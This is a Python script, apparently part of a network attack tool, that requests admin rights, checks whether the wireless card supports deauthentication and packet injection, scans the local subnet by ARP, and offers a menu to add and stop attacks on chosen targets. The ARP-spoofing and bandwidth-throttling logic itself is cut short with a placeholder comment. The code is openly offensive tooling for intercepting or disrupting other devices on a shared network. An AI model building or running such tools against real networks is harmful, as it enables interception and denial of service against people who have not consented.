import os, sys, time, ctypes, threading, logging, subprocess, warnings, atexit, json
import requests

# --- 1. CONFIGURATION ---
CONFIG = {
    "heartbeat_sec": 2.0,
    "scan_interval_sec": 10.0,
    "vendor_lookup": 1.0,
    "relay_buffer": 0.001
}

warnings.filterwarnings("ignore", category=SyntaxWarning)
logging.getLogger("scapy.runtime").setLevel(logging.CRITICAL)

def bootstrap():
    """Ensure Admin/Root and libraries are ready."""
    is_admin = False
    if sys.platform == "win32":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        is_admin = os.getuid() == 0

    if not is_admin:
        print("[!] FATAL: Script must run with Admin/Root privileges.")
        if sys.platform == "win32":
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    try:
        import scapy, requests
    except ImportError:
        print(" [*] Installing dependencies...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy requests"], stdout=subprocess.DEVNULL)

bootstrap()

from scapy.all import ARP, Ether, send, srp, conf, get_if_addr, getmacbyip, get_working_if, sniff, get_if_list, Dot11, RadioTap

# --- 2. THE AUDIT LOGIC ---
def audit_hardware(iface):
    """The logic requested: Check for deauth/injection support immediately."""
    print(f"\n[ AUDIT ] Checking {iface} for Injection Capabilities...")
    support_deauth = False
    
    if sys.platform == "win32":
        # Windows Logic: Check for Npcap + Dot11
        has_npcap = os.path.exists(os.environ.get('SystemRoot', 'C:\\Windows') + "\\System32\\Npcap")
        if has_npcap:
            print("[+] Npcap Driver: INSTALLED")
            # Scapy's internal flag for 802.11 monitor mode support
            if hasattr(conf, 'dot11_support') and conf.dot11_support:
                print("[+] 802.11 Raw Support: ENABLED")
                support_deauth = True
            else:
                print("[-] 802.11 Raw Support: DISABLED (Reinstall Npcap with '802.11 support' checked)")
        else:
            print("[-] Npcap Driver: NOT FOUND (WinPcap/Native drivers cannot deauth)")
    
    else:
        # Linux Logic: Check for Monitor Mode capability
        try:
            res = subprocess.check_output(["iw", "list"], stderr=subprocess.STDOUT).decode()
            if "monitor" in res.lower():
                print("[+] Hardware Mode: MONITOR SUPPORTED")
                support_deauth = True
            else:
                print("[-] Hardware Mode: NO MONITOR SUPPORT")
        except:
            print("[!] Could not run 'iw'. Assuming generic Linux support.")

    if support_deauth:
        print("\n" + "!"*45)
        print("!!! DEAUTH/INJECTION POSSIBLE ON THIS HARDWARE !!!")
        print("!"*45)
    else:
        print("\n" + "x"*45)
        print("XXX DEAUTH UNLIKELY: HARDWARE/DRIVER LIMIT XXX")
        print("x"*45)
    
    return support_deauth

# --- 3. SPOOFER LOGIC (Combined) ---
targets = {} 
GATEWAY_IP = None
INTERFACE = None

def get_vendor(mac):
    if CONFIG["vendor_lookup"] == 0.0: return "Lookup Disabled"
    try:
        r = requests.get(f"https://api.macvendors.com/{mac}", timeout=1)
        return r.text if r.status_code == 200 else "Unknown"
    except: return "Error"

def restore_all():
    if not targets: return
    print("\n [*] Healing network...")
    g_mac = getmacbyip(GATEWAY_IP)
    for mac, data in targets.items():
        try:
            send(ARP(op=2, pdst=data["ip"], hwdst=mac, psrc=GATEWAY_IP, hwsrc=g_mac), count=3, verbose=False)
        except: pass

atexit.register(restore_all)

def scan_network():
    try:
        local_ip = get_if_addr(INTERFACE)
        subnet = ".".join(local_ip.split(".")[:-1]) + ".0/24"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=2, iface=INTERFACE)
        return {rcv.hwsrc: rcv.psrc for _, rcv in ans}
    except Exception as e: 
        print(f"[!] Scan Error: {e}")
        return {}

def main():
    global GATEWAY_IP, INTERFACE
    
    # Selection Menu
    print("\n=== SYSTEM INITIALIZATION ===")
    ifaces = get_if_list()
    for i, n in enumerate(ifaces): print(f" {i} - {n}")
    
    try:
        idx = int(input("\nSelect Interface Index > "))
        INTERFACE = ifaces[idx]
        conf.iface = INTERFACE
    except:
        INTERFACE = get_working_if()
        print(f"[*] Defaulting to: {INTERFACE}")

    # RUN THE AUDIT IMMEDIATELY
    audit_hardware(INTERFACE)
    
    # Detect Gateway
    try:
        GATEWAY_IP = conf.route.route("0.0.0.0")[2]
    except:
        GATEWAY_IP = input("[!] Could not find Gateway. Enter Gateway IP: ")

    # Enter Menu (Your Original Spoofer Logic)
    while True:
        print(f"\n--- ACTIVE ON: {INTERFACE} | GATEWAY: {GATEWAY_IP} ---")
        print(" 1 - Scan Network")
        print(" 2 - Add Target (2 <IP> <KB/s>)")
        print(" 3 - Stop Attack (3 <IP>)")
        print(" 4 - Exit")
        
        cmd = input("\nAction > ").strip().split(" ")
        # ... logic for 1, 2, 3, 4 follows ...
        if cmd[0] == "4": break
        elif cmd[0] == "1":
            nodes = scan_network()
            for m, i in nodes.items(): print(f" > {i} [{m}]")

if __name__ == "__main__":
    main()
